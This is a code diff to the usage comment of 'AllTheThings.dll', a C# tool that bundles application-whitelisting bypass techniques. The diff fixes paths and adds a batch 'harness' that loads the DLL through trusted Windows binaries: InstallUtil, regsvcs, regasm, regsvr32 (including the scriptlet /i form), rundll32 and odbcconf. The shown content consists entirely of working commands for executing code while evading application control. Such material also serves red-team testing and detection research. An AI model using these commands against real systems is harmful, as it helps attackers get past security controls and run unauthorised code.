@@ -30,7 +30,7 @@ Includes 5 Known Application Whitelisting/ Application Control Bypass Techinique
 Usage:
 1.
     x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
-    x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.3031964\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+    x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
 2.
     x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
     x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
@@ -45,10 +45,26 @@ Usage:
     rundll32 AllTheThings.dll,EntryPoint
 
 6.
-    odbcconf.exe /a { REGSVR AllTheThings.dll }
+    odbcconf.exe /s /a { REGSVR AllTheThings.dll }
 
 7.
     regsvr32.exe /s /n /i:"Some String To Do Things ;-)" AllTheThings.dll
+
+
+Sample Harness.Bat
+
+[Begin]
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
+regsvr32 /s /u AllTheThings.dll
+regsvr32 /s AllTheThings.dll
+rundll32 AllTheThings.dll,EntryPoint
+odbcconf.exe /a { REGSVR AllTheThings.dll }
+regsvr32.exe /s /n /i:"Some String To Do Things ;-)" AllTheThings.dll
+[End]
+
+
 */
 
 [assembly: ApplicationActivation(ActivationOption.Server)]
